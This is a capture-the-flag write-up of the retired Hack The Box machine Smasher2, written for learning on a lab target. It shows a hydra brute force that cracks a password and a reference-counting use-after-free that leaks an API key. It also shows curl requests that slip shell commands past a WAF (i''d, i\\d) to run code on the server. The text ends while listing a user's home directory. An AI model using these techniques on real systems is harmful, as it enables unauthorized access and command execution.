---
title: HTB: Smasher2
url: https://0xdf.gitlab.io/2019/12/14/htb-smasher2.html
date: 2019-12-14T13:45:00+00:00
difficulty: Insane [50]
os: Linux
tags: htb-smasher2, hackthebox, ctf, exploit, auth-bypass, logic-error, python, reference-counting, kernal-driver, mmap, reverse-engineering
---

![Smasher2](https://0xdfimages.gitlab.io/img/smasher2-cover.png)

Like the first Smasher, Smasher2 was focused on exploitation. However this one didn’t have a buffer overflow or what I typically think of as binary exploitation. It starts with finding a vulnerability in a compiled Python module (written in C) to get access to an API key. Then I’ll have to bypass a WAF to use that API to get execution and then a shell onSmasher2. For PrivEsc, I’ll need to exploit a kernel driver to get a root shell.

## Box Info

| Name | [Smasher2](https://hackthebox.com/machines/smasher2)  [Smasher2](https://hackthebox.com/machines/smasher2) [Play on HackTheBox](https://hackthebox.com/machines/smasher2) |
| --- | --- |
| Release Date | [01 Jun 2019](https://twitter.com/hackthebox_eu/status/1134026959871234048) |
| Retire Date | 14 Dec 2019 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Smasher2 |
| Radar Graph | Radar chart for Smasher2 |
| First Blood User | 07:13:55[opt1kz opt1kz](https://app.hackthebox.com/users/58052) |
| First Blood Root | 20:29:49[xct xct](https://app.hackthebox.com/users/13569) |
| Creators | [dzonerzy dzonerzy](https://app.hackthebox.com/users/1963)  [xG0 xG0](https://app.hackthebox.com/users/11652) |

## Recon

### nmap

`nmap` shows three services, SSH (TCP 22), HTTP (TCP 80), and DNS (TCP and UDP 53):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.135
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-02 01:15 EDT
Warning: 10.10.10.135 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.135
Host is up (0.093s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.57 seconds
root@kali# nmap -p 22,53,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.135
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-02 01:18 EDT
Nmap scan report for 10.10.10.135
Host is up (0.095s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 23:a3:55:a8:c6:cc:74:cc:4d:c7:2c:f8:fc:20:4e:5a (RSA)
|   256 16:21:ba:ce:8c:85:62:04:2e:8c:79:fa:0e:ea:9d:33 (ECDSA)
|_  256 00:97:93:b8:59:b5:0f:79:52:e1:8a:f1:4f:ba:ac:b4 (ED25519)
53/tcp open  domain  ISC BIND 9.11.3-1ubuntu1.3 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.3-Ubuntu
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.29 seconds

root@kali# nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.10.10.135                                                                                                            
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-29 09:08 EDT
Warning: 10.10.10.135 giving up on port because retransmission cap hit (10).
Nmap scan report for wonderfulsessionmanager.smasher2.htb (10.10.10.135)
Host is up (0.52s latency).
Not shown: 65456 open|filtered ports, 78 closed ports
PORT   STATE SERVICE
53/udp open  domain

Nmap done: 1 IP address (1 host up) scanned in 77.20 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, it looks like Ubuntu Bionic (18.04).

### Website - TCP 80

#### Site

Just the default Apache page:

![1559453182593](https://0xdfimages.gitlab.io/img/1559453182593.png)

#### gobuster

I’ll make sure to add 401 to the whitelist of status codes:

```

root@kali# gobuster -u http://10.10.10.135 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -o scans/gobuster_root_small -s '200,204,301,302,307,403,401'           

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.135/
[+] Threads      : 50
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,401,403
[+] Timeout      : 10s
=====================================================
2019/06/02 01:20:24 Starting gobuster
=====================================================
/backup (Status: 401)
=====================================================
2019/06/02 01:25:36 Finished
=====================================================

```

#### Brute Force Auth

When the box was released, `/backup` was protected by `.htpassword` which presents as a pop-up for basic auth. This has since been removed from the box, so if you visit `/backup` today, you’re taken directly there. I’ll talk about my thought process at the time.

I used `hydra` to brute force the login. I normally wouldn’t try this here, as it seems bad form to need to brute force both username and password, but one of the box authors dropped a hint on Mattermost which was also posted to the [HTB forums](https://forum.hackthebox.eu/discussion/1870/smasher2/p1):

![1561813020162](https://0xdfimages.gitlab.io/img/1561813020162.png)

So I’ll make a wordlist with `grep`, which reduced the list by a factor of about 22:

```

root@kali# wc -l rockyou*
   639676 rockyou-startswithc.txt
 14344392 rockyou.txt
 14984068 total

```

Now I can use that list to brute force with `hydra`:

```

root@kali# hydra -l admin -P /usr/share/wordlists/rockyou-startswithc.txt -s 80 -f 10.10.10.135 http-get /backup
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-06-02 01:25:32
[DATA] max 16 tasks per 1 server, overall 16 tasks, 639677 login tries (l:1/p:639677), ~39980 tries per task
[DATA] attacking http-get://10.10.10.135:80/backup
[80][http-get] host: 10.10.10.135   login: admin   password: clarabibi
[STATUS] attack finished for 10.10.10.135 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-06-02 04:14:57

```

It finds the credentials, admin:clarabibi.

#### /backup

With the creds (or today without them), I can reach the page which has two files:

![1561813183522](https://0xdfimages.gitlab.io/img/1561813183522.png)

I’ll download both.

### DNS - TCP/UDP 53

DNS on TCP is typically only open for Zone Transfers. So that’s the first thing I’ll try. I’ll guess the domain names `smasher.htb` and `smasher2.htb`. The second returns interesting results:

```

root@kali# dig axfr @10.10.10.135 smasher2.htb

; <<>> DiG 9.11.5-P4-5-Debian <<>> axfr @10.10.10.135 smasher2.htb
; (1 server found)
;; global options: +cmd
smasher2.htb.           604800  IN      SOA     smasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800
smasher2.htb.           604800  IN      NS      smasher2.htb.
smasher2.htb.           604800  IN      A       127.0.0.1
smasher2.htb.           604800  IN      AAAA    ::1
smasher2.htb.           604800  IN      PTR     wonderfulsessionmanager.smasher2.htb.
smasher2.htb.           604800  IN      SOA     smasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800
;; Query time: 113 msec
;; SERVER: 10.10.10.135#53(10.10.10.135)
;; WHEN: Sat Jun 29 09:11:01 EDT 2019
;; XFR size: 6 records (messages 1, bytes 242)

```

I’ll add three domains to my `/etc/hosts` file:

```
10.10.10.135 wonderfulsessionmanager.smasher2.htb smasher2.htb root.smasher2.htb

```

`root.smasher2.htb` returns the same default Apache page.

### wonderfulsessionmanager

#### Site

The site is for the DZONERZY Session Manager (DSM):

![](https://0xdfimages.gitlab.io/img/smasher-wsm-root.png)

#### Login Page

At the top there’s a “Try Login” button. It goes to a login page:

![1561815425579](https://0xdfimages.gitlab.io/img/1561815425579.png)

No basic guesses let me in, so I’ll go take a look at the code from `/backup`.

### Source Code Overview

The two files I pulled from `/backup` make a Python Flask web application. The main code is `auth.py`. The second line is `import ses`, which will load the `.so` shared library just like any other Python module.

The `ses` library is used to create an object with the login creds at the start of the application. Unfortunately for me, the username and password were redacted from this backup code:

```

 38 def safe_init_manager(id):
 39     lock.acquire()
 40     if id in Managers:
 41         del Managers[id]
 42     else:
 43             login = ["<REDACTED>", "<REDACTED>"]
 44             Managers.update({id: ses.SessionManager(login, craft_secure_token(":".join(login)))})
 45     lock.release()

```

The Flask app has a function, `before_request` that is decorated with `@app.before_request`, so it will run with each request before it’s passed to the route handling code:

```

 54 @app.before_request
 55 def before_request():
 56     if request.path == "/":
 57         if not session.has_key("id"):
 58             k = get_secure_key()
 59             safe_init_manager(k)
 60             session["id"] = k
 61         elif session.has_key("id") and not safe_have_manager(session["id"]):
 62             del session["id"]
 63             return redirect("/", 302)
 64     else:
 65         if session.has_key("id") and safe_have_manager(session["id"]):
 66             pass
 67         else:
 68             return redirect("/", 302)

```

This code ensures that a session is created for each visit, or it redirects to `/`.

The app has five routes, `/assets/<path:filename>`, `/`, `/login`, `/auth`, and `/api`. The last two are the most interesting.

## Shell as dzonerzy

### Obtain API Key

#### Source Review

When I try to log into the page, there’s a POST to `/auth`. If I look at that code, I have the following:

```

 89 @app.route('/auth', methods=['POST'])
 90 def login():
 91     ret = {"authenticated": None, "result": None}
 92     manager = safe_get_manager(session["id"])
 93     data = request.get_json(silent=True)
 94     if data:
 95         try:
 96             tmp_login = dict(data["data"])
 97         except:
 98             pass
 99         tmp_user_login = None
100         try:
101             is_logged = manager.check_login(data)
102             secret_token_info = ["/api/<api_key>/job", manager.secret_key, int(time.time())]
103             try:
104                 tmp_user_login = {"username": tmp_login["username"], "password": tmp_login["password"]}
105             except:
106                 pass
107             if not is_logged[0]:
108                 ret["authenticated"] = False
109                 ret["result"] = "Cannot authenticate with data: %s - %s" % (is_logged[1], "Too many tentatives, wait 2 minutes!" if manager.blocked else "Try again!")
110             else:
111                 if tmp_user_login is not None:
112                     log_creds(request.remote_addr, tmp_user_login)
113                 ret["authenticated"] = True
114                 ret["result"] = {"endpoint": secret_token_info[0], "key": secret_token_info[1], "creation_date": secret_token_info[2]}
115         except TypeError as e:
116             ret["authenticated"] = False
117             ret["result"] = str(e)
118     else:
119         ret["authenticated"] = False
120         ret["result"] = "Cannot authenticate missing parameters."
121     return jsonify(ret)

```

Now is where I need to understand the `manager` object, which relies on the module in `ses.so`. Here’s what the `can_login` function that is called on line 101 above looks like in Ida Pro:

![1570903084609](https://0xdfimages.gitlab.io/img/1570903084609.png)

One other note about from the Python code - the api key, stored as `manager.secret_key` is set here:

```

 43             login = ["<REDACTED>", "<REDACTED>"]
 44             Managers.update({id: ses.SessionManager(login, craft_secure_token(":".join(login)))})

```

Looking at `craft_secure_token()`, it’s just taking the input and hashing it:

```

 17 def craft_secure_token(content):
 18     h = hmac.new("HMACSecureKey123!", base64.b64encode(content).encode(), hashlib.sha256)
 19     return h.hexdigest()

```

That means that as long as the username and password don’t change, and API key won’t either.

#### Method 1: Exploit Reference Count

This is the intended method, but it’s *very* difficult to spot. I wouldn’t have spotted this on my own, and thanks to the people who helped me get to where I understand it.

Python objects are allocated on the heap, and a reference count is kept to watch if they are in use, and when the reference count reaches 0, the garbage collector frees the space. When you write Python code, this is managed for you. But once you start writing C extensions (compiles to `.so` file), you have to [manage these references yourself](http://edcjones.tripod.com/refcount.html). There’s a [series of C macros](https://docs.python.org/3.8/c-api/refcounting.html) that will help to do that. I can start by looking at a Python object by looking at [object.c](https://github.com/python/cpython/blob/master/Include/object.h) in the CPython source.

First, I’ll see that the object structure is such that the first value in any object is `ob_refcnt`, the reference count:

```

typedef struct _object {
    _PyObject_HEAD_EXTRA
    Py_ssize_t ob_refcnt;
    struct _typeobject *ob_type;
} PyObject;

```

I can also see the `PyINCREF(op)` macro is basically just a call to `_PyINCREF`, which basically just adds one to that reference counter value:

```

static inline void _Py_INCREF(PyObject *op)
{
    _Py_INC_REFTOTAL;
    op->ob_refcnt++;
}

#define Py_INCREF(op) _Py_INCREF(_PyObject_CAST(op))

```

Similarly, if I look at `Py_DECREF`, its the same, except the code run not only decrements the reference counter, but if that counter is 0, it calls `_Py_Dealloc` on the object:

```

static inline void _Py_DECREF(const char *filename, int lineno,
                              PyObject *op)
{
    (void)filename; /* may be unused, shut up -Wunused-parameter */
    (void)lineno; /* may be unused, shut up -Wunused-parameter */
    _Py_DEC_REFTOTAL;
    if (--op->ob_refcnt != 0) {
#ifdef Py_REF_DEBUG
        if (op->ob_refcnt < 0) {
            _Py_NegativeRefcount(filename, lineno, op);
        }
#endif
    }
    else {
        _Py_Dealloc(op);
    }
}

#define Py_DECREF(op) _Py_DECREF(__FILE__, __LINE__, _PyObject_CAST(op))

```

`_Py_Dealloc` isn’t defined in this, as it’s only for use within the interpreter code, according to the docs. The following functions or macros are only for use within the interpreter core: `_Py_Dealloc()`, `_Py_ForgetReference()`, `_Py_NewReference()`, as well as the global variable `_Py_RefTotal`.

I’ll open the module in Ghidra and take a look at the disassembly. When I start to look through the code with that knowledge, I start to see instances of what I think are these macros. For example, in `SessionManager_check_login`, at line 44:

```

  post_has_data = dict_contains(post_data,&data);
  if ((char)post_has_data != '\x01') {
    *post_data = *post_data + -1;
    if (*post_data == 0) {
      (**(code **)(post_data[1] + 0x30))(post_data);
    }
    plVar2 = (long *)ErrorMsg(PyExc_TypeError,"Missing data parameter",parameter,uVar3,in_R8B,in_R9B
                              ,(char)parameter);
    goto LAB_0010250e;
  }

```

It calls `dict_contains` to see if the passed into it (my POST) is a dictionary that contains the key “data”. If that doesn’t return true (`'\x01'`), then it will decrement the reference counter, and then check if it’s now 0. If it is, it will call `post_data[1] + 0x30` on itself.

Since I know `post_data` is a dictionary object, I can look at the [Python source](https://github.com/python/cpython/blob/a016d4e32cc9faa48105d00db275439c3dc93559/Objects/dictobject.c#L2813) for `dictobject.c` to see where the structure is defined:

```

PyTypeObject PyDictIterItem_Type = {
    PyVarObject_HEAD_INIT(&PyType_Type, 0)
    "dictionary-itemiterator",                  /* tp_name */
    sizeof(dictiterobject),                     /* tp_basicsize */
    0,                                          /* tp_itemsize */
    /* methods */
    (destructor)dictiter_dealloc,               /* tp_dealloc */
    0,                                          /* tp_print */
    0,                                          /* tp_getattr */
    0,                                          /* tp_setattr */
    0,                                          /* tp_compare */
    0,                                          /* tp_repr */
    0,                                          /* tp_as_number */
    0,                                          /* tp_as_sequence */
    0,                                          /* tp_as_mapping */
    0,                                          /* tp_hash */
    0,                                          /* tp_call */
    0,                                          /* tp_str */
    PyObject_GenericGetAttr,                    /* tp_getattro */
    0,                                          /* tp_setattro */
    0,                                          /* tp_as_buffer */
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC,/* tp_flags */
    0,                                          /* tp_doc */
    (traverseproc)dictiter_traverse,            /* tp_traverse */
    0,                                          /* tp_clear */
    0,                                          /* tp_richcompare */
    0,                                          /* tp_weaklistoffset */
    PyObject_SelfIter,                          /* tp_iter */
    (iternextfunc)dictiter_iternextitem,        /* tp_iternext */
    dictiter_methods,                           /* tp_methods */
    0,
};

```

Knowing that `PyVarObject_HEAD_INIT` [expands to](https://docs.python.org/2/c-api/structures.html) `1, type, size,`, and assuming that each word is 8 bytes, 0x30 bytes in is ` (destructor)dictiter\_dealloc`.

So, going back up, I’ve found what the `Py_DECREF` macro looks like.

Similarly, I see places in the code that look like:

```
*data_object = *data_object + 1;

```

This is the `Py_INCREF` macro expanded.

With that foundation, I’ll go back to the code at hand. The error is in how the the references are tracked for the Python object `data` which is read from the request:

```

 93     data = request.get_json(silent=True)

```

That is later passed into `manager.check_login`:

```

101             is_logged = manager.check_login(data)

```

The result, `is_logged` contains the original submitted json in `is_logged[1]`, which is referenced in the error message:

```

109                 ret["result"] = "Cannot authenticate with data: %s - %s" % (is_logged[1], "Too many tentatives, wait 2 minutes!" if manager.blocked else "Try again!")

```

When I do a failed login, the POSTed JSON shows up in place of that first `%s`:

```

{
	"authenticated": false,
	"result": "Cannot authenticate with data: {u'username': u'0xdf', u'password': u'password'} - Try again!"
}

```

Looking in the C, I can see on the second line after the variable declarations where a new list object is created:

```

return_list_object = (long *)PyList_New(2);

```

A bit further down, after checks that the key `data` is in the posted JSON / dictionary, it reads the data object into an object, which I’ve named `data_object`:

```

data_object = (long *)get_dict_key(post_data,&data);

```

Next there’s a block that checks if the user is blocked, and handles it:

```

  user_is_blocked = is_blocked(user_login);
  if ((char)user_is_blocked == '\x01') {
    user_is_blocked = can_login(user_login);
    if ((char)user_is_blocked != '\0') {
      set_unblocked(user_login);
      set_login_count(user_login,0);
    }
    local_50 = (long *)PyBool_FromLong(0);
    *local_50 = *local_50 + 1;
    *(long **)return_list_object[3] = local_50;
    *data_object = *data_object + 1;
    *(long **)(return_list_object[3] + 8) = data_object;
  }

```

I’ll note that a Boolean False is created (and then the reference counter incremented by `Py_INCREF`), and that’s stored in the third word of the list object. Then `data_object` is passed to `Py_INCREF`, and then set as 8 bytes into that same third object. So the third object in a list must be the list itself (and the first object is the ref count). At the very end of this function, I see this is the object returned:

```
  *return_list_object = *return_list_object + 1;
  plVar2 = return_list_object;
LAB_0010250e:
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return plVar2;

```

The ref count on the list object is incremented, and then its set to `plVar2` which is returned.

I can see a similar pattern if the user is not blocked. There’s a check for the login count, and it’s that’s less than 10, it loads the username and password both from the POSTed JSON and from the internal storage. And then there are three possible paths which I’ll show here:

```

      __s2 = (char *)get_internal_usr(user_login);
      success = strcmp(username_string,__s2);
      if (success == 0) {
        __s2 = (char *)get_internal_pwd(user_login);
        success = strcmp(password_string,__s2);
        if (success == 0) {
          puVar1 = (undefined8 *)return_list_object[3];
          return_value = PyBool_FromLong(1);
          *puVar1 = return_value;
          *data_object = *data_object + 1;
          *(long **)(return_list_object[3] + 8) = data_object;
          goto LAB_001024c5;
        }
      }
      puVar1 = (undefined8 *)return_list_object[3];
      return_value = PyBool_FromLong(0);
      *puVar1 = return_value;
      *data_object = *data_object + 1;
      *(long **)(return_list_object[3] + 8) = data_object;
    }
    else {
      set_blocked(user_login);
      local_48 = (long *)PyBool_FromLong(1);
      *local_48 = *local_48 + 1;
      puVar1 = (undefined8 *)return_list_object[3];
      return_value = PyBool_FromLong(0);
      *puVar1 = return_value;
      *(long **)(return_list_object[3] + 8) = data_object;
    }

```

The first is if the username and password match. It calls `Py_INCREF` on `data_object`, sets it to 8 bytes into list, and sets 0 bytes into the list as True.

If there’s a failure on the username or password, it `Py_INCREF`s `data_ojbect`, sets the first item in the list to False, called `Py_INCREF` on `data_object`, and then puts `data_object` as the second.

The third path is if the login count isn’t less than 10. It sets the first list item to False, and the second list item to `data_object`.

What’s missing? It didn’t increment the reference count for `data_object`! And the next code (which all the paths go through) is:

```

LAB_001024c5:
  *data_object = *data_object + -1;
  if (*data_object == 0) {
    (**(code **)(data_object[1] + 0x30))(data_object);
  }
  *return_list_object = *return_list_object + 1;
  plVar2 = return_list_object;

```

This is `Py_DECREF` on `data_object`.

What does this mean? At the end of this call, if it’s the 11th failed login, the `data_object` with username and password will be marked as no longer referenced, and thus open for garbage collection, even though that same memory will be printed out in the error message when the code gets back into the Python.

It turns out, right after the call to `manager.check_login(data)`, it creates an object, regardless of the outcome of `check_login`:

```

101             is_logged = manager.check_login(data)
102             secret_token_info = ["/api/<api_key>/job", manager.secret_key, int(time.time())]

```

A few lines later, the login failure is identified and the message is constructed:

```

107             if not is_logged[0]:
108                 ret["authenticated"] = False
109                 ret["result"] = "Cannot authenticate with data: %s - %s" % (is_logged[1], "Too many tentatives, wait 2 minutes!" if manager.blocked else "Try again!")

```

Here’s how this is exploited:
- I send 10 failed logins. The user state is not set to blocked.
- I send an 11th login attempt, but with modified data so that it contains the same structure as `secret_token_info`, and list with two strings and an int, as opposed to what the site sends which is a dictionary with two keys.
- `manager.check_login()` will fail because of the block, and decrement the reference count on `data_object`, allowing the garbage collector to mark that space on the heap as open.
- The program allocates space on the heap for `secret_token_info`, a Python object with two strings and an int. Since the space that `data_object` was in before it was garbage collected was just that size, it will use that space.
- When the error message is sent, because of the garbage collection error, the pointer to `data_object` now points to `secret_token_info`, and that information is displayed instead.

In practice, here’s how this is going to work. I’ll make sure FoxyProxy is sending through Burp, and set intercept on. I’ll submit an obviously incorrect username and password, 0xdf:0xdf:

[![login in burp](https://0xdfimages.gitlab.io/img/1570905331203.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1570905331203.png)

I’ll right click on this, and send it to repeater. when I pushed “Send”, I get the failure to authenticate message:

[![repeater](https://0xdfimages.gitlab.io/img/1570905381860.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1570905381860.png)

I’ll push Send nine more times.

Now I’ll change it so that `data` is an array with two strings and an int. It doesn’t matter what their values are. I’ll use `{"action":"auth","data":["0xdf", "string", 223]}`. When I submit, the error message has the leaked information in it, including the API key and how to use it:

[![api key leaked](https://0xdfimages.gitlab.io/img/1570933498445.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1570933498445.png)

That’s:

```

{"authenticated":false,"result":"Cannot authenticate with data: ['/api/<api_key>/job', 'fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8', 1570904638] - Too many tentatives, wait 2 minutes!"}

```

#### Method 2: Username == Password

Here I looked at the code that checks the username and password. First this block loads the input username and password, then calls `get_internal_usr`, and compares the input username to the result:

![1570906220495](https://0xdfimages.gitlab.io/img/1570906220495.png)

If it matches, it continues here, where it calls `get_internal_pwd` and compares the user input password to the result:

![1570906095855](https://0xdfimages.gitlab.io/img/1570906095855.png)

If this compare matches, it returns `True`.

I’ll remember from the initiation code that the login object is a list with two items, probably username and password:

```

 43             login = ["<REDACTED>", "<REDACTED>"]
 44             Managers.update({id: ses.SessionManager(login, craft_secure_token(":".join(login)))})

```

Diving into `get_internal_usr` (I’ll look in Ghidra to get decomplied code), I see the following:

```

undefined8 get_internal_usr(undefined8 param_1)

{
  long *plVar1;
  undefined8 uVar2;
  
  plVar1 = (long *)PyObject_GetAttrString(param_1,"user_login");
  uVar2 = PyList_GetItem(plVar1,0);
  uVar2 = PyString_AsString(uVar2);
  *plVar1 = *plVar1 + -1;         // Py_DECREF
  if (*plVar1 == 0) {
    (**(code **)(plVar1[1] + 0x30))(plVar1);
  }
  return uVar2;
}

```

The `user_login` object is fetched using `PyObject_GetAttrString`, which is the list with username and password from above. Then on the next line the first item in the list is retrieved, handled as a string, and after a call to `Py_DECREF`, returned. This is all as I’d expect.

Now I’ll take a look at `get_internal_pwd`:

```

undefined8 get_internal_pwd(undefined8 param_1)

{
  long *plVar1;
  undefined8 uVar2;
  
  plVar1 = (long *)PyObject_GetAttrString(param_1,"user_login");
  uVar2 = PyList_GetItem(plVar1,0);  // This should be 1, not 0
  uVar2 = PyString_AsString(uVar2);
  *plVar1 = *plVar1 + -1;
  if (*plVar1 == 0) {
    (**(code **)(plVar1[1] + 0x30))(plVar1);
  }
  return uVar2;
}

```

It does that same thing, including grabbing the first item in the list, not the second. This means the password is actually checked against the stored username!

Knowing that, I was able to spend a few minutes and guess the credentials, Administrator:Administrator. On doing so, it returns an API key and endpoint information:

![1561816019417](https://0xdfimages.gitlab.io/img/1561816019417.png)

When I get a shell, I can check the unredacted code and see it was trying to set the username and password to something unguessable:

```

login = ["Administrator", "SuperSecretAdminPWD123!"]  

```

But that username / password combo doesn’t work, because the second item is never checked.

### API Execution

#### Code Analysis

Now that I have the api key, I’ll turn to `/api`. The code for the `/api` path given to me shows that I can run commands:

```

@app.route("/api/<key>/job", methods=['POST'])
def job(key):
    ret = {"success": None, "result": None}
    manager = safe_get_manager(session["id"])
    if manager.secret_key == key:
        data = request.get_json(silent=True)
        if data and type(data) == dict:
            if "schedule" in data:
                out = subprocess.check_output(['bash', '-c', data["schedule"]])
                ret["success"] = True
                ret["result"] = out
            else:
                ret["success"] = False
                ret["result"] = "Missing schedule parameter."
        else:
            ret["success"] = False
            ret["result"] = "Invalid value provided."
    else:
        ret["success"] = False
        ret["result"] = "Invalid token."
    return jsonify(ret)

```

I need to POST json data and have a key `schedule` in it with the value being what I want to run.

I also see a check for the session at the top, so I’ll include my session cookie, pulled from Burp, as well.

#### Fail to Run

I build the following `curl` command:

```

root@kali# curl -s -H "Cookie: session=eyJpZCI6eyIgYiI6IllUVTVZbVptTjJOa1l6ZzNNVEUyWm1Vd016YzFPRFJoTWpobVkyTTJZbUUxWmpKbU5tRXpNZz09In19.XRd2ZQ.-hB4ig0S1CyfDTgRmuhV4CdKP4c" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data '{"schedule":"id"}'

```

What does it do:
- `-s` allows me to pipe the results without the status bar;
- `-H "Cookie: session=eyJp..."` adds my session cookie;
- `-H "Content-Type: application/json"` tells the server to handle the POST data as json;
- `http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job` is the given url from logging in;
- `--data '{"schedule":"id"}'` is to try to run the command `id`.

It fails:

```

root@kali# curl -s -H "Cookie: session=eyJpZCI6eyIgYiI6IllUVTVZbVptTjJOa1l6ZzNNVEUyWm1Vd016YzFPRFJoTWpobVkyTTJZbUUxWmpKbU5tRXpNZz09In19.XRd2ZQ.-hB4ig0S1CyfDTgRmuhV4CdKP4c" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data '{"schedule":"id"}'
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job
on this server.<br />
</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at wonderfulsessionmanager.smasher2.htb Port 80</address>
</body></html>

```

#### WAF

403 forbidden isn’t a response I see in the code. If the keys don’t match, I should get a 200 with json saying success was `False`. This leads me to think there might be a WAF blocking the requests.

I’ll start to play with different commands to see what I can get through. `id` was small, but what about `w`? It returns results:

```

root@kali# curl -s -H "Cookie: session=eyJpZCI6eyIgYiI6IllUVTVZbVptTjJOa1l6ZzNNVEUyWm1Vd016YzFPRFJoTWpobVkyTTJZbUUxWmpKbU5tRXpNZz09In19.XRd2ZQ.-hB4ig0S1CyfDTgRmuhV4CdKP4c" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data '{"schedule":"w"}'
{"result":" 17:44:38 up 5 days, 15:47,  0 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\n","success":true}

```

Ok, so back to `id`, can I add some WAF evasion to the string to get it through? [This link](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0) has some good WAF evasion techniques.

| Input | Result |
| --- | --- |
| `'{"schedule":"id"}'` | 403 Forbidden |
| `'{"schedule":"i?"}'` | 500 Server Error |
| `'{"schedule":"i\?"}'` | 400 Bad Request |
| `"{\"schedule\":\"i''d\"}"` | `{"result":"uid=1000(dzonerzy) gid=1000(dzonerzy) groups=1000(dzonerzy)...[snip]...\n","success":true}` |
| `'{"schedule":"i\\d"}'` | `{"result":"uid=1000(dzonerzy) gid=1000(dzonerzy) groups=1000(dzonerzy)...[snip]...\n","success":true}` |

I found a couple ways to get commands through the WAF, both `''` and `\\` to break up words.

### Read user.txt

I can use this command processing to check for home directories - only one:

```

root@kali# curl -s --data '{"schedule":"l\\s /home/"}' -H "Cookie: session=eyJpZCI6eyIgYiI6IllUVTVZbVptTjJOa1l6ZzNNVEUyWm1Vd016YzFPRFJoTWpobVkyTTJZbUUxWmpKbU5tRXpNZz09In19.XRd2ZQ.-hB4ig0S1CyfDTgRmuhV4CdKP4c" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job | jq -r '.result'
dzonerzy

```

Inside that homedir, there’s `user.txt`:

```

root@kali# curl -s --data '{"schedule":"l\\s -\\l\\a /home/dzonerzy/"}' -H "Cookie: session=eyJpZCI6eyIgYiI6Ik1XTmpZVEJsWldKaU1EQTROakEzTldWaFpqSTBZakpsTm1JMU5qSXdaVGRtWTJFMVpEUXlNdz09In19.XRfV3w.yIrue2DcpN4NAJwYDMUOAohsbSU" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job | jq -r '.result'
total 44
drwxr-xr-x 6 dzonerzy dzonerzy 4096 Feb 17 15:26 .
drwxr-xr-x 3 root     root     4096 Feb 15 21:58 ..
lrwxrwxrwx 1 dzonerzy dzonerzy    9 Feb 15 22:01 .bash_history -> /dev/null
-rw-r--r-- 1 dzonerzy dzonerzy  220 Feb 15 21:58 .bash_logout
-rw-r--r-- 1 dzonerzy dzonerzy 3799 Feb 16 22:48 .bashrc
drwx------ 3 dzonerzy dzonerzy 4096 Feb 15 22:00 .cache
drwx------ 3 dzonerzy dzonerzy 4096 Feb 15 22:05 .gnupg
drwx------ 5 dzonerzy dzonerzy 4096 Feb 17 15:26 .local
-rw-r--r-- 1 dzonerzy dzonerzy  807 Feb 15 21:58 .profile
-rw-r--r-- 1 root     root      900 Feb 16 01:16 README
